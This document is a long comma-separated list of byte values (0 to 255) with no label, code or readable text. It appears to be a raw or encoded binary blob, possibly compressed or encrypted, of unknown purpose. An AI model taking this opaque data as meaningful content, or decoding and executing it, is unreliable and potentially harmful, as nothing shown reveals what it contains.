57,226,161,45,33,111,96,47,137,217,81,31,10,150,192,148,140,101,54,34,98,62,124,107,47,118,96,42,172,218,202,135,36,196,159,129,150,79,33,112,122,215,39,225,189,235,33,97,172,201,175,130,19,22,80,203,132,87,251,5,113,105,104,229,172,210,234,186,175,237,182,161,84,7,85,24,31,92,21,39,230,76,15,228,170,188,62,111,90,10,71,238,81,93,95,60,83,247,140,139,68,69,74,46,19,246,123,107,56,37,50,111,155,220,11,105,28,150,221,149,148,121,108,96,61,58,180,96,109,97,123,55,189,136,204,134,86,218,193,140,144,29,127,33,44,196,191,241,174,172,113,98,232,199,162,140,1,26,77,214,212,6,235,30,122,15,249,224,170,201,186,186,176,234,248,138,22,12,79,64,27,74,60,84,178,94,68,225,166,231,35,47,71,65,74,221,26,90,6,47,30,147,204,136,5,82,85,60,197,242,39,111,55,36,96,127,163,53,26,101,10,212,214,236,143,59,32,58,204,36,158,126,125,104,60,126,189,220,131,230,51,200,219,137,193,20,96,106,18,219,191,255,225,172,111,97,239,193,162,8,11,77,8,154,196,94,217,0,38,29,160,189,177,164,168,252,235,238,186,69,71,90,5,71,31,9,9,10,247,86,140,228,235,238,50,105,52,81,119,111,59,87,12,116,31,135,204,252,78,65,52,61,135,186,55,99,109,55,33,47,144,127,84,105,81,155,134,197,221,59,157,108,154,58,173,48,117,42,115,38,244,250,146,178,116,219,139,140,203,4,11,113,81,196,168,171,231,235,37,126,246,247,175,0,11,6,17,204,221,13,235,68,0,95,233,172,176,227,168,167,235,252,239,69,92,12,21,80,27,82,5,10,49,86,157,186,227,246,38,121,33,3,77,116,65,1,88,60,21,159,220,128,95,16,98,118,153,246,115,114,59,59,106,176,156,47,66,28,68,220,156,132,22,40,196,48,216,60,166,114,11,113,49,253,255,176,193,253,36,135,183,206,144,10,8,118,76,133,168,191,191,245,63,253,254,234,229,8,0,111,25,194,223,87,74,31,0,69,175,231,177,161,168,53,187,227,186,54,84,11,79,27,11,10,14,72,65,17,197,176,183,175,58,46,34,122,106,108,90,67,78,46,31,132,193,142,86,67,119,38,133,186,115,108,59,110,106,171,203,22,84,24,28,212,146,141,13,122,199,51,216,40,163,97,97,39,103,162,255,236,204,173,104,219,194,220,7,13,10,107,81,195,168,235,185,68,107,251,242,152,229,0,118,90,25,208,93,71,89,4,7,121,231,244,162,164,250,47,160,175,186,29,69,10,13,26,192,67,95,26,83,28,223,249,156,167,43,111,96,37,44,60,72,1,92,60,145,154,218,142,87,82,35,46,213,240,97,118,113,110,60,172,155,123,86,125,10,155,139,129,127,32,149,34,205,32,230,108,101,104,39,190,219,241,145,223,53,219,202,220,71,14,64,49,30,215,168,240,174,85,112,255,172,228,213,71,31,23,249,206,21,77,80,23,80,4,171,231,235,18,160,112,229,249,225,73,26,97,47,17,204,75,103,88,11,94,223,254,239,32,62,45,122,97,124,41,81,10,92,100,128,209,157,138,71,29,123,109,195,100,115,102,106,39,35,170,137,63,75,108,219,198,138,196,18,126,194,109,216,230,167,110,109,104,96,171,175,177,139,247,175,144,202,154,91,84,9,99,74,192,190,176,184,122,110,182,129,171,239,8,87,86,150,206,68,29,80,4,0,20,171,49,235,93,161,57,242,237,172,40,64,20,46,8,130,6,54,25,93,71,210,204,251,49,112,127,90,43,54,104,64,74,112,100,129,147,152,145,71,82,113,144,216,122,60,110,63,53,50,173,137,99,48,105,218,192,193,141,18,40,145,55,202,241,224,32,47,60,125,160,222,180,186,173,165,138,141,194,2,84,24,112,76,34,225,251,167,11,127,255,187,183,51,28,19,108,228,128,1,94,79,23,27,198,231,66,174,84,161,44,242,189,244,27,33,18,113,28,148,82,3,74,83,155,143,249,246,96,32,52,122,82,47,110,112,74,26,60,224,129,241,143,10,0,80,243,217,39,125,110,121,13,125,234,181,56,88,110,143,155,147,213,18,49,199,153,202,177,233,113,53,36,100,166,164,246,250,230,234,200,138,214,80,29,87,3,81,31,164,183,188,5,112,251,172,173,47,4,17,22,178,150,26,16,79,18,64,140,251,53,181,18,161,57,254,175,126,64,36,20,114,92,128,19,77,28,1,128,157,143,247,116,33,62,56,39,96,41,110,90,105,45,128,147,142,139,4,129,43,209,128,104,39,110,48,48,165,247,252,103,122,47,222,198,202,149,18,25,197,205,193,230,158,98,109,104,49,250,135,176,189,173,158,170,195,192,80,20,22,93,18,93,187,181,188,4,117,235,226,176,46,105,87,70,247,153,65,89,89,14,0,215,189,94,235,74,168,55,238,227,102,80,101,2,46,8,148,16,65,1,67,132,140,220,239,125,50,108,63,51,59,113,120,12,42,48,136,128,142,105,82,145,48,215,216,104,63,34,219,101,225,200,223,123,114,63,155,254,147,90,18,75,199,218,203,241,161,33,34,124,182,234,189,234,179,190,253,193,155,64,27,79,16,75,92,85,164,178,252,8,248,231,162,157,61,80,101,64,229,209,70,2,89,83,93,131,172,94,246,78,63,57,167,255,45,73,101,14,114,65,198,83,68,26,22,146,238,152,227,38,53,126,48,32,51,40,110,74,114,60,220,146,218,112,31,145,49,209,151,104,96,125,222,49,235,167,234,111,99,104,197,229,140,26,7,25,220,140,208,169,251,113,98,126,248,224,228,182,179,183,215,225,208,84,112,78,13,29,9,31,238,241,87,5,170,251,188,249,47,74,17,0,165,91,65,93,24,7,0,158,253,18,0,72,39,100,240,254,38,93,55,64,114,219,198,66,15,7,29,198,157,218,161,124,34,59,36,61,60,47,12,79,60,181,155,198,193,111,86,145,53,215,158,42,111,126,149,105,162,190,237,100,48,172,201,166,192,11,30,8,179,212,188,165,61,110,11,44,231,240,226,160,174,252,233,236,203,84,64,89,10,1,30,68,26,163,71,93,245,243,226,249,94,6,65,62,165,89,17,71,16,7,18,215,128,21,75,31,54,118,172,225,126,26,57,33,46,154,204,0,67,1,69,138,201,218,43,61,42,33,112,59,106,125,120,49,111,174,156,202,204,110,71,211,48,217,16,42,115,98,192,105,241,172,171,110,42,227,168,162,144,93,22,85,195,223,6,235,61,108,79,123,231,178,249,160,208,229,181,248,145,84,92,27,90,0,16,24,10,179,12,28,232,160,161,228,42,40,26,113,185,68,65,64,68,78,6,150,129,15,71,31,34,57,176,237,49,106,84,42,113,137,148,87,92,28,7,129,152,218,123,103,48,36,40,123,114,101,104,101,126,239,134,131,153,124,93,135,222,209,95,122,112,38,222,43,179,178,170,113,123,166,209,229,145,114,88,25,209,159,73,224,30,122,73,13,229,240,165,204,160,179,253,235,145,71,27,20,20,1,15,17,74,234,94,94,174,234,226,32,44,119,87,102,136,68,18,66,64,72,147,134,205,21,71,20,46,43,235,96,126,59,59,32,110,221,154,76,25,81,140,128,131,202,126,103,118,104,33,63,48,63,120,12,109,174,234,193,192,114,138,202,156,141,29,36,44,34,147,43,191,209,170,111,123,235,197,162,214,71,86,21,150,137,28,253,7,45,126,66,248,162,245,176,250,176,239,186,215,84,1,79,4,3,64,18,20,225,29,28,169,161,173,96,124,46,15,50,175,29,66,93,60,69,240,223,230,21,16,119,46,45,171,110,55,113,62,38,105,137,156,81,52,68,179,158,159,209,123,18,52,35,73,180,122,47,107,123,49,189,132,209,252,124,219,202,135,243,29,122,55,98,223,202,162,250,251,112,98,242,193,164,208,0,76,122,194,143,77,238,4,119,73,241,244,236,173,168,170,252,176,248,213,65,2,79,80,19,0,5,62,226,17,143,251,133,182,33,49,127,13,117,247,94,94,64,48,14,134,150,216,24,70,74,63,197,170,58,112,121,46,50,101,159,99,90,51,68,204,135,152,152,105,120,96,189,62,253,99,34,107,96,126,189,199,138,251,117,144,196,155,208,78,48,44,23,192,181,167,231,185,118,114,232,134,246,28,75,29,91,139,195,94,176,69,2,29,224,187,171,173,236,252,254,234,160,89,29,14,30,0,92,70,77,78,192,28,142,188,132,247,58,53,122,70,50,113,72,1,6,60,66,199,135,153,69,29,59,62,133,132,115,42,107,59,50,247,198,127,22,63,94,128,219,197,140,40,218,118,193,61,245,42,109,118,18,118,177,176,148,183,40,174,223,215,151,29,20,49,92,193,250,252,189,169,103,97,237,181,187,71,80,75,91,206,152,23,167,2,93,15,251,226,162,180,168,161,160,248,232,29,71,11,26,0,75,90,79,25,31,76,223,250,170,186,50,114,42,63,62,37,70,80,62,112,21,139,143,139,31,29,48,108,207,171,102,111,43,99,36,252,133,63,78,37,10,192,146,153,13,39,197,50,192,97,184,61,109,112,97,178,177,241,207,166,63,200,199,206,27,19,15,49,15,199,250,186,166,185,107,225,242,182,175,16,1,65,77,167,149,75,27,31,5,20,172,227,195,173,236,33,176,255,183,11,90,10,100,77,92,67,42,73,93,23,157,252,240,143,50,23,46,32,43,116,26,67,7,60,78,203,193,205,2,90,54,96,207,172,43,60,56,55,123,168,157,22,78,54,70,199,149,196,14,105,194,34,158,40,172,122,36,120,125,160,170,170,141,190,116,138,134,194,6,10,14,116,12,196,164,163,188,83,103,255,170,183,190,24,1,6,77,139,78,29,80,2,10,14,248,187,136,72,252,46,170,225,240,94,68,16,13,28,221,74,67,10,23,23,157,228,133,252,125,121,96,39,106,110,7,38,78,60,199,128,153,151,84,6,35,103,243,236,100,126,33,115,59,218,133,56,16,125,9,134,142,223,30,43,210,34,151,33,166,44,47,45,43,170,251,170,131,172,110,129,140,199,30,21,95,123,30,131,250,236,182,94,5,188,254,249,165,0,75,7,249,150,91,94,16,6,94,69,250,244,181,81,176,49,189,164,186,92,17,10,51,106,131,6,69,74,71,94,157,224,234,116,35,60,125,107,46,125,10,67,108,48,128,129,152,193,95,69,49,46,216,97,107,58,59,105,59,251,155,48,11,115,192,198,130,207,95,103,180,52,216,167,246,106,57,42,127,178,242,236,215,236,253,218,207,218,10,14,22,38,10,133,234,187,246,120,116,140,129,249,175,65,81,29,247,208,22,12,16,3,91,122,160,52,187,76,240,55,228,163,244,11,57,2,115,0,154,90,30,29,11,76,138,221,239,44,34,36,119,85,48,63,1,12,108,52,208,157,135,128,8,82,123,141,222,104,49,13,109,39,33,190,163,99,48,47,220,134,198,213,30,122,210,159,192,241,253,45,127,58,123,186,216,182,170,182,241,156,145,215,18,29,16,118,13,85,225,194,189,82,51,251,186,249,105,17,91,2,224,211,50,80,75,27,80,142,160,66,178,93,231,109,160,237,237,29,36,16,66,74,219,22,77,77,90,208,223,208,183,116,112,36,118,63,50,125,111,83,49,46,154,155,142,136,84,192,52,139,208,60,115,110,107,53,123,172,253,103,114,100,222,218,227,217,12,40,220,130,128,187,180,115,97,102,115,160,228,250,170,173,253,154,195,156,18,7,13,6,92,15,186,237,225,5,37,238,172,236,47,1,87,71,181,154,11,78,89,17,74,135,229,21,182,9,168,97,254,175,103,64,98,64,121,4,135,82,77,68,95,128,141,148,235,109,102,35,40,32,49,116,104,17,105,50,132,147,142,128,75,211,106,152,132,10,21,15,43,52,160,174,185,123,55,110,197,134,145,133,6,17,128,195,145,231,236,122,126,42,182,226,239,176,191,230,253,192,138,199,85,114,15,65,14,69,252,198,162,16,107,167,224,235,116,65,87,22,163,194,26,66,24,102,80,144,171,79,191,93,237,107,238,254,60,90,101,2,92,30,156,81,69,1,69,155,148,139,241,102,115,62,122,33,99,111,107,17,126,44,154,138,153,105,83,211,48,159,128,42,115,110,207,50,250,170,170,119,20,113,223,197,192,113,10,17,144,221,140,184,215,98,63,113,185,187,201,252,179,190,156,138,214,22,4,97,12,80,52,68,234,175,236,125,245,177,186,240,116,26,98,6,227,92,50,93,1,16,64,215,250,91,180,85,46,49,186,163,44,64,99,16,40,27,152,22,4,65,28,244,210,148,227,125,59,45,109,38,61,110,29,85,126,95,202,151,218,111,21,145,55,159,155,123,42,61,222,52,160,170,251,62,59,117,139,245,203,27,7,91,144,170,128,253,251,4,82,126,244,190,173,171,161,251,245,236,140,93,26,66,24,27,6,93,250,182,94,5,176,224,238,240,49,91,3,86,238,95,70,78,13,7,113,158,250,5,75,85,81,47,240,251,49,90,38,2,126,129,135,78,92,92,26,209,197,148,101,33,96,63,49,127,88,63,107,82,38,189,208,145,199,62,14,129,51,150,216,113,111,118,198,39,187,176,161,119,126,238,145,245,142,3,92,25,173,205,145,186,88,110,95,42,231,230,232,160,241,251,245,224,145,84,5,27,17,26,30,69,75,170,6,82,249,224,238,151,49,26,79,62,165,70,66,47,81,11,18,141,145,21,74,5,118,57,241,249,126,11,59,50,111,155,214,26,94,80,27,146,143,144,38,103,70,33,69,82,114,52,58,127,38,189,128,131,207,114,5,156,96,193,14,42,113,115,217,46,179,172,160,118,98,233,128,191,203,19,9,8,128,223,80,187,67,45,14,102,172,186,163,182,162,234,241,233,195,71,70,24,12,118,0,28,64,186,18,5,232,182,238,234,127,54,16,47,228,10,83,78,22,31,135,140,137,24,82,15,34,46,247,171,114,112,46,32,44,152,214,66,5,92,17,135,217,218,124,44,111,117,48,51,48,53,107,107,108,175,152,193,134,124,84,203,206,155,20,127,45,110,152,49,179,247,225,117,114,176,216,254,130,7,23,10,211,223,17,241,118,98,73,127,250,165,183,234,170,229,253,239,215,53,91,66,71,71,94,84,0,170,71,16,232,177,167,34,116,52,13,124,239,90,11,15,115,85,132,141,203,4,16,81,38,57,172,49,28,117,120,106,49,129,204,54,65,94,128,135,129,218,125,98,34,35,36,224,59,101,58,110,60,171,156,131,204,101,173,197,135,217,8,113,28,121,198,62,246,236,170,103,96,187,219,248,168,6,28,16,144,132,23,169,2,58,19,42,187,176,249,191,191,242,191,246,203,84,27,31,8,82,65,69,88,177,59,10,170,172,167,115,47,89,16,55,251,28,1,29,43,11,155,158,153,65,10,84,32,153,174,98,105,107,34,106,37,137,134,75,87,65,199,198,149,215,32,102,108,108,106,188,61,99,47,101,102,229,207,209,173,108,221,221,206,193,29,104,23,125,219,164,187,182,176,118,98,240,157,162,92,26,65,10,194,222,17,251,23,98,82,187,166,171,248,250,191,242,245,240,207,17,17,68,8,90,82,20,86,163,82,212,252,161,231,59,61,52,17,91,231,70,17,66,60,30,147,202,205,15,82,76,103,158,243,61,118,121,118,77,36,156,59,75,49,1,128,220,148,129,101,54,44,212,63,246,59,120,42,115,106,233,236,131,230,105,129,192,206,129,121,100,118,70,197,191,186,174,183,110,59,172,155,165,71,29,90,122,206,212,76,161,85,91,79,166,160,186,173,168,165,186,178,238,93,12,77,30,26,19,30,81,23,7,79,147,170,134,172,60,127,121,124,48,58,10,80,41,60,18,240,198,193,65,82,97,39,151,160,18,119,45,126,34,183,137,100,90,106,98,194,219,141,148,61,156,52,216,103,240,126,97,106,115,126,180,184,138,173,36,200,144,135,217,17,121,119,30,222,168,209,183,185,113,97,170,236,248,27,88,14,91,164,212,82,85,82,0,79,224,166,162,233,237,253,224,185,239,65,66,100,89,17,26,16,68,12,93,10,145,232,250,230,123,101,54,58,62,115,68,86,45,60,74,134,144,214,75,64,45,54,197,164,61,109,119,43,34,190,157,56,91,41,91,195,155,217,22,97,202,114,202,103,180,96,126,55,115,162,175,146,155,230,101,196,197,198,5,29,90,122,12,253,231,186,160,161,107,161,231,249,185,119,5,23,80,134,132,76,68,94,70,15,254,226,240,249,186,116,235,163,234,84,84,80,114,28,81,94,2,86,17,87,157,251,175,188,38,56,108,122,124,108,10,85,0,120,85,193,130,203,31,27,103,34,135,250,96,103,117,13,62,168,199,56,26,116,90,128,155,158,74,127,147,97,216,74,188,38,109,126,58,152,239,250,149,173,106,156,218,156,91,17,77,111,18,149,168,179,162,68,117,161,254,249,185,68,90,76,23,194,95,73,65,2,101,12,252,187,250,75,206,42,160,191,248,71,43,75,66,1,214,67,103,12,83,75,137,225,227,238,81,55,106,37,119,41,64,27,78,115,128,212,142,141,71,29,97,107,159,250,101,96,45,62,115,234,203,127,0,110,208,216,139,158,10,122,210,112,155,106,230,114,47,123,49,225,171,234,151,252,46,221,134,218,11,5,22,113,13,158,164,183,254,16,107,189,231,249,200,80,31,27,184,203,78,28,74,23,64,21,229,70,224,84,190,57,227,244,233,73,84,23,47,65,214,66,25,114,55,87,140,188,250,102,96,105,48,51,108,125,0,81,44,125,132,209,204,216,19,27,42,32,133,123,58,127,117,39,50,190,159,35,83,47,157,153,145,129,81,49,192,113,214,190,188,45,63,124,97,161,242,224,143,172,169,196,143,206,18,12,1,99,22,85,189,187,236,78,37,243,188,238,164,80,3,29,181,209,7,77,27,23,6,95,168,87,181,85,178,109,187,248,241,80,101,17,44,27,134,0,12,25,65,76,128,150,239,32,33,111,106,61,102,107,42,23,114,115,196,220,151,149,35,82,47,144,158,123,18,32,107,70,35,178,133,93,61,63,135,167,253,207,10,105,155,143,209,234,167,113,124,100,58,190,233,173,241,241,253,222,167,172,18,8,24,99,13,31,230,137,189,28,117,186,212,173,42,80,100,76,179,149,17,94,75,0,26,146,255,35,235,93,234,47,239,181,38,92,36,17,127,24,132,65,31,26,65,129,223,129,239,120,58,62,125,63,45,51,63,77,38,110,132,154,220,140,87,145,102,139,216,36,49,110,26,110,36,234,237,96,48,63,209,151,130,159,13,91,144,197,214,169,186,106,122,104,115,170,164,170,191,237,253,129,166,219,10,10,16,29,13,84,168,163,250,15,105,250,253,232,42,74,65,14,224,203,83,82,11,16,28,208,240,5,240,79,250,57,242,248,109,73,36,21,46,65,157,30,68,64,65,230,142,204,183,103,50,33,119,124,99,108,120,80,102,104,128,185,156,110,79,129,47,186,155,113,39,44,97,110,186,183,181,97,98,37,192,128,149,207,30,17,203,205,128,186,163,32,123,58,231,252,245,246,245,173,179,200,202,198,30,79,87,5,13,81,184,163,231,20,188,224,253,173,88,92,91,14,247,204,28,88,78,31,90,131,187,3,240,18,187,43,182,175,110,29,34,2,114,8,133,0,103,43,95,129,217,152,239,116,34,111,36,103,32,117,120,17,104,126,162,219,220,62,33,158,43,141,158,113,115,120,149,110,179,252,181,123,126,110,130,218,140,5,16,8,155,171,156,241,228,43,84,48,182,170,163,172,213,178,238,218,202,84,3,25,87,3,12,93,252,236,190,83,176,188,252,235,127,16,16,92,181,10,83,92,17,78,80,158,253,68,250,77,62,55,161,225,107,27,36,11,101,133,152,26,65,98,95,129,252,214,170,122,59,127,49,37,51,115,57,83,112,52,193,143,135,3,2,145,35,156,151,127,116,58,215,48,191,240,185,127,57,111,193,163,142,81,70,4,210,158,203,169,86,32,13,33,244,234,226,173,165,251,181,235,202,24,3,25,1,2,86,24,252,234,86,8,156,180,186,249,47,68,10,38,228,33,28,92,22,64,2,220,250,79,82,69,97,57,234,164,110,73,57,14,61,155,154,39,4,90,83,208,223,139,124,124,107,57,77,33,114,24,96,81,102,172,220,196,207,51,5,158,58,203,8,104,112,120,158,53,241,176,225,37,88,172,139,191,138,113,87,21,210,153,128,160,14,106,92,120,244,165,227,244,225,254,229,235,213,76,64,13,90,19,22,79,23,183,77,14,230,253,186,187,96,72,87,50,255,81,26,7,78,85,70,139,219,78,53,81,63,41,173,244,112,11,62,106,114,137,156,66,90,1,28,192,129,218,40,122,109,101,32,39,100,117,111,21,44,179,238,219,135,3,87,211,49,145,84,60,47,103,215,69,166,173,251,107,97,247,193,228,142,19,86,75,155,197,80,165,31,98,19,123,150,161,228,177,245,242,241,228,210,69,0,110,75,10,19,78,0,251,94,21,253,217,226,235,43,46,21,112,176,72,7,78,64,69,129,137,219,95,27,31,107,57,226,181,55,59,33,62,52,137,190,0,92,11,205,155,222,139,59,116,43,127,106,63,122,122,111,55,109,181,128,141,134,57,94,196,220,215,14,48,54,55,222,68,240,182,175,107,38,240,209,239,138,31,70,75,202,159,10,253,5,119,55,41,244,178,173,161,186,176,236,186,140,88,80,25,31,81,82,5,86,177,94,20,170,255,182,38,45,96,3,106,181,7,1,71,52,7,134,158,142,79,94,18,46,57,160,100,60,121,37,107,49,198,190,91,4,81,134,131,223,204,105,122,54,105,59,224,55,127,42,98,109,252,152,199,156,117,219,219,221,209,15,120,112,98,206,237,225,160,251,117,37,142,139,164,144,75,22,94,194,130,6,241,67,58,29,100,244,235,249,168,161,235,169,236,138,76,77,28,31,31,6,85,74,251,75,14,170,243,182,59,127,113,16,62,178,72,83,0,40,19,128,137,153,68,74,72,34,216,246,110,108,45,120,50,42,154,130,80,50,91,198,208,132,128,59,54,49,128,97,230,96,57,42,107,108,189,136,146,230,111,192,154,217,129,19,120,99,103,133,168,225,236,251,116,102,212,201,245,92,11,2,91,194,143,63,231,23,43,14,171,172,178,191,206,160,176,238,180,0,6,86,26,8,87,70,78,26,186,76,209,224,251,224,32,47,52,3,107,163,42,74,66,104,78,147,139,137,5,0,45,38,216,247,127,38,48,37,125,116,154,93,80,60,91,221,192,141,152,12,116,34,203,63,184,32,109,120,60,114,175,182,143,190,53,196,221,219,205,95,121,42,97,223,225,179,186,173,105,38,237,235,175,80,90,30,91,141,143,18,185,27,70,17,251,253,238,236,252,246,141,239,186,27,22,17,30,27,92,90,93,75,95,63,143,251,227,249,106,127,125,10,45,109,90,75,7,36,101,138,209,153,8,71,47,34,189,226,58,60,111,63,123,190,209,119,22,52,1,195,146,141,217,63,197,48,216,33,252,114,109,32,49,230,229,182,131,172,110,193,154,206,208,95,84,42,70,149,186,241,232,241,63,114,187,171,229,26,81,36,0,204,217,17,13,5,7,20,255,160,162,165,190,187,251,227,160,64,126,68,5,65,112,0,4,11,65,17,157,251,237,250,50,105,42,63,43,52,81,67,78,48,7,219,137,138,31,65,97,108,151,236,97,126,43,49,113,241,203,119,78,125,93,212,132,223,18,32,138,43,138,57,184,124,25,102,107,163,174,254,153,236,109,196,139,199,26,15,91,111,23,222,189,161,166,181,1,234,233,233,174,26,19,113,11,209,95,76,13,6,3,84,253,253,162,185,188,57,251,162,238,73,71,2,67,73,19,82,15,26,28,77,157,240,183,161,60,33,119,51,43,106,68,77,22,48,95,134,218,139,86,6,69,118,158,184,49,103,119,110,60,248,203,62,82,41,72,155,145,194,23,101,194,71,204,32,180,32,47,122,49,164,172,246,215,247,124,218,219,222,28,9,24,116,118,143,168,166,236,4,110,225,230,170,174,16,71,14,163,144,74,17,65,23,18,17,254,230,181,78,225,40,234,254,237,65,92,2,25,76,198,90,50,65,83,94,213,161,161,103,123,36,127,59,55,105,80,83,94,48,218,133,237,149,82,16,65,77,151,226,115,110,106,41,112,221,137,123,76,41,218,218,148,129,22,122,199,48,205,58,164,110,36,113,43,160,175,184,208,216,233,156,202,154,2,10,17,52,95,215,166,182,160,89,117,190,254,236,183,90,81,7,190,215,95,82,30,27,27,19,249,95,228,20,164,57,189,162,172,6,6,17,114,29,221,65,67,0,28,82,183,148,161,124,103,60,54,51,62,50,1,80,60,53,218,139,152,143,31,63,106,97,232,42,43,38,43,114,42,218,128,111,100,116,217,220,218,133,76,101,150,112,202,241,164,58,117,14,107,178,189,184,144,193,185,193,151,218,7,5,11,55,18,75,252,163,191,28,126,188,183,182,254,90,26,7,165,194,50,23,115,23,70,135,229,64,174,93,228,46,242,225,168,29,63,86,51,71,156,94,69,86,0,77,137,145,251,109,37,121,43,38,123,117,32,67,119,41,205,157,158,223,12,16,97,141,131,97,33,58,121,41,43,252,173,100,42,125,134,199,140,236,92,96,128,196,202,235,188,48,63,122,39,225,179,184,160,172,169,138,195,168,15,4,24,27,7,34,240,177,189,94,117,243,188,182,116,90,69,14,229,163,83,28,64,85,18,134,165,91,230,93,235,40,254,248,118,69,103,77,61,107,154,91,67,81,17,139,136,218,201,32,59,45,56,113,32,100,106,74,1,52,152,129,154,153,75,156,47,205,153,123,18,54,55,116,112,168,175,127,61,50,201,195,148,194,70,91,176,219,151,169,224,48,63,104,125,166,203,234,191,252,241,170,151,190,83,20,90,1,10,75,231,163,160,15,77,177,251,224,46,80,65,76,190,194,83,10,81,69,91,204,250,74,162,93,177,112,160,252,63,91,126,64,46,71,245,65,67,65,17,146,197,152,173,99,50,35,42,59,114,108,111,23,56,60,136,138,207,36,94,163,45,202,216,123,97,58,107,52,187,166,170,93,103,101,201,182,145,81,30,75,196,130,216,251,224,45,109,121,250,166,226,236,241,237,239,170,195,223,26,20,64,1,16,28,160,241,224,79,251,189,247,247,42,4,25,0,178,150,74,22,27,31,1,139,166,94,202,93,38,40,160,248,28,71,55,27,127,73,135,87,69,10,65,129,142,145,242,116,62,62,59,58,42,116,48,34,126,110,145,144,220,53,14,218,49,144,153,122,49,58,148,52,179,190,169,119,20,49,199,216,144,19,23,15,222,195,192,224,162,110,15,125,187,230,228,175,241,168,241,223,129,12,64,79,124,70,118,93,168,225,77,28,170,255,189,182,127,90,13,14,230,28,67,64,80,19,28,215,233,87,174,5,124,43,238,254,55,17,117,2,51,203,213,16,25,72,64,193,212,152,239,122,118,62,103,113,96,15,120,89,3,229,132,146,147,116,19,128,108,192,151,42,49,54,195,110,241,183,175,62,106,106,139,187,149,1,77,25,202,205,154,200,85,32,82,97,236,190,164,236,251,168,241,234,129,27,100,13,15,71,86,75,185,234,11,12,224,231,175,249,61,0,21,119,249,47,95,1,1,19,80,137,187,67,92,93,61,124,171,162,103,71,37,112,45,154,128,76,77,91,83,198,143,144,96,124,118,78,36,37,126,125,55,87,108,255,193,145,204,59,85,192,64,141,4,127,33,103,206,50,189,183,185,110,106,233,139,239,155,65,13,25,210,205,76,186,23,118,14,100,244,188,161,184,161,176,239,244,202,76,3,25,87,6,10,68,64,182,23,18,232,186,173,249,107,44,16,124,136,91,71,88,80,7,30,140,218,66,82,18,56,119,163,237,49,6,62,124,66,209,133,76,4,36,11,221,132,142,105,96,64,62,36,51,100,63,116,39,118,177,202,145,199,29,80,223,221,217,95,39,33,38,222,70,191,182,225,50,42,242,128,166,205,5,124,87,157,132,77,160,92,122,21,97,182,178,161,164,163,225,179,210,151,0,74,27,11,92,10,68,74,175,28,78,232,161,238,123,114,37,3,124,226,72,7,78,61,22,128,215,136,65,94,85,124,55,163,229,114,54,101,59,105,157,154,80,77,72,216,155,158,215,59,59,59,61,40,43,19,99,116,18,59,173,202,143,150,110,73,193,228,152,15,123,99,103,215,53,189,191,246,17,106,172,227,166,130,27,13,25,203,223,56,190,23,42,91,39,231,174,173,188,189,227,253,187,222,67,85,31,30,1,69,31,0,177,70,80,186,253,248,112,37,56,15,102,238,92,95,89,43,95,209,255,220,125,94,9,122,49,236,39,114,48,33,33,51,153,142,66,116,70,206,146,157,128,105,120,109,104,32,189,123,34,108,103,108,189,220,131,214,100,198,211,220,213,90,127,123,58,215,191,187,236,234,37,124,246,155,161,205,29,24,15,164,205,13,188,2,98,29,60,237,162,227,225,225,242,241,172,138,0,18,3,68,27,74,75,0,234,6,21,225,227,167,115,49,92,11,62,249,9,91,78,48,83,139,208,204,68,66,85,103,197,235,103,111,107,55,58,111,203,190,78,100,95,205,129,159,152,101,124,48,151,40,164,111,35,32,98,49,189,208,215,175,104,193,211,140,217,13,59,52,6,131,240,247,162,177,1,98,154,201,239,28,2,0,75,141,132,11,165,91,112,82,233,252,176,190,231,252,242,253,234,6,71,23,3,27,71,10,60,88,173,77,209,167,175,254,37,49,119,3,62,251,26,6,28,53,69,249,150,153,94,94,113,122,211,186,96,46,107,37,32,53,218,8,75,113,95,149,132,141,204,61,157,34,207,36,230,114,10,120,123,38,180,247,148,182,112,129,176,150,129,14,11,114,18,144,201,252,231,240,126,21,246,247,183,65,85,14,87,212,222,94,187,27,74,82,250,244,178,186,236,189,242,253,244,27,53,26,85,8,3,27,76,11,93,77,201,170,227,231,50,37,56,74,48,52,90,17,89,60,9,223,253,153,73,16,106,122,213,238,97,126,121,99,125,167,135,127,88,115,95,218,146,141,140,43,210,96,206,59,180,114,35,108,103,253,180,184,145,236,124,129,211,135,200,29,86,123,7,152,168,171,174,181,37,253,254,249,166,74,86,98,12,154,223,74,61,31,74,4,224,186,176,191,234,179,189,249,240,65,90,11,27,71,57,10,25,57,28,94,136,166,235,238,50,116,33,51,48,111,28,2,28,50,83,147,220,128,31,6,108,60,195,176,33,126,119,100,58,178,154,96,80,63,81,199,155,217,23,32,144,42,187,124,180,114,109,60,97,253,177,175,148,247,106,132,223,192,18,73,8,45,30,152,252,204,174,172,116,188,237,235,245,76,10,14,9,144,68,73,22,94,80,127,224,229,171,184,230,118,225,162,234,93,92,2,29,27,192,17,93,76,64,14,157,255,241,167,38,107,45,33,113,111,12,74,7,45,9,157,193,193,85,6,55,34,153,226,97,98,43,41,37,255,219,47,91,41,65,192,230,141,76,38,198,49,128,36,245,32,125,122,33,188,244,250,193,230,86,156,209,150,6,95,75,116,75,223,202,161,162,16,110,224,172,233,187,27,19,14,251,206,93,77,85,2,27,19,185,227,177,15,161,40,160,253,246,69,0,2,13,74,133,16,77,77,83,14,157,186,244,28,115,35,49,32,35,104,72,85,1,104,152,193,128,208,14,10,45,62,213,100,102,15,121,43,50,234,137,62,75,47,201,198,203,141,6,61,210,43,212,40,224,108,127,33,127,167,168,236,149,247,238,183,151,135,112,95,10,115,30,158,250,187,189,94,127,225,254,211,162,8,16,6,190,214,7,87,74,5,0,55,229,5,176,74,177,112,160,237,160,5,66,17,53,30,157,19,30,65,49,12,148,142,245,61,37,63,48,51,54,101,80,1,27,45,128,209,236,205,94,82,35,122,134,42,122,118,117,39,50,250,203,101,48,113,212,193,139,207,13,40,199,109,136,207,246,54,100,24,97,178,181,160,162,208,184,170,212,198,18,124,17,122,92,74,160,170,239,78,107,171,239,225,183,4,87,71,254,209,1,17,85,23,27,142,166,94,227,62,187,48,242,237,241,11,126,64,46,92,245,68,77,84,83,208,197,145,246,120,42,111,113,122,65,110,58,10,118,43,202,209,142,153,14,0,47,202,131,104,127,58,104,107,34,190,171,56,123,117,134,140,205,149,13,97,197,205,193,241,167,72,97,125,125,188,255,161,231,169,169,208,215,216,18,14,74,4,12,9,184,246,167,78,114,161,240,189,101,27,15,26,179,139,83,6,85,11,109,220,233,71,162,19,176,42,229,254,48,17,32,97,127,30,132,68,2,11,66,158,148,143,247,54,60,60,125,37,122,60,104,79,44,126,136,240,142,141,84,156,48,155,213,33,115,40,110,54,161,172,175,37,98,110,222,221,139,206,11,10,219,149,208,186,167,50,109,97,125,165,245,234,213,172,253,192,205,138,87,5,22,0,70,83,225,194,189,93,63,255,143,171,47,74,3,25,255,194,